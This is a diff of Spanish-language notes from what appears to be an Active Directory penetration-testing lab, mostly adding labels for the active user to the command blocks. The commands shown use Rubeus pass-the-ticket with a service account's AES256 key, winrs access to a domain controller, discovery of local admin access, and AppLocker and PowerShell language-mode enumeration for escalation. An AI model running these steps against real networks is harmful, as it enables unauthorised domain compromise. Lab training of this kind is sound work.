@@ -447,7 +447,7 @@ Obteniendo las credenciales de svcadmin *6366243a657a4ea04e406f1abc27f1ada358ccd
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-Pudiendo ahora acceder a svcadmin con winrs
+Pudiendo ahora acceder a *svcadmin* con winrs, desde la ventana emergente de cmd que nos genera Rubeus
 ```shell
 winrs -r:dcorp-dc cmd
 ```
@@ -455,36 +455,42 @@ winrs -r:dcorp-dc cmd
 ## Escalada de privilegios abusando de la administración local derivada a través de dcorp-adminsrv
 Lo primero que deberemos de hacer es saber en que maquinas tenemos privilegios de administrador local
 ```shell
+[student97]
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 ```
 ```shell
 Find-PSRemotingLocalAdminAccess
 ```
 
-Vemos que tenemos tenemos privilegios de administrador local en adminsrv
+Vemos que tenemos tenemos privilegios de administrador local en *adminsrv*
 A continuación vamos a enumerar los servicios corriendo en esta maquina
 ```shell
+[svcadmin]
 sc query
 ```
 
 En caso de querer buscar un servicio en concreto como este caso *AppLocker*, utiliza un servicio del que depende llamado *AppIDSvc*
 ```shell
+[adminsvc]
 sc query AppIDSvc
 ```
 
 Una vez confirmemos que este servicio existe, buscaremos si existe la configuración de *AppLocker*
 ```shell
+[adminsvc]
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
 ```
 
 La respuesta nos desvela que este esta configurado, además de mostrarnos las políticas definidas para múltiples tipos de ejecución
 Para saber si hay alguna regla/política demasiado permisiva haremos la siguiente enumeración en cada resultado obtenido en la salida anterior
 ```shell
+[adminssvc]
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\<ruta>
 ```
 
 A continuación enumeraremos estas enumerando uno por uno los *GUID*
 ```shell
+[adminsvc]
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\<ruta>\<GUID>
 ```
 
@@ -497,17 +503,20 @@ Una ves la enumeremos tenemos que prestar atención a parámetros que pueden hac
 
 Encontramos una regla muy permisiva en
 ```shell
+[adminsvc]
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
 ```
 
 Ya que es una regla predeterminada que permite a todos ejecutar scripts desde *C:\ProgramFiles*
 También podemos enumerar estas detrás de una forma mas clara usando una conexión remota desde nuestro propio equipo, realizaremos la conexión remota usando el siguiente comando que nos otorgara una *PowerShell*
 ```shell
+[student97]
 Enter-PSSession dcorp-adminsrv
 ```
 
 Podemos enumerar el tipo de lenguaje que usa
 ```shell
+[dcorp-adminsrv]
  $ExecutionContext.SessionState.LanguageMode
 ```
 Te muestra el tipo de lenguaje de PowerShell implementado siendo *FullLanguage* -> sin restricciones, *ConstrainedLanguage* -> muy limitado y *NoLanguage* -> casi bloqueado
@@ -515,6 +524,7 @@ En esta caso es *ConstrainedLanguage*
 
 Y una vez en la conexión Obtendremos las políticas de *AppLocker* de la maquina
 ```shell
+[dcorp-adminsrv]
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
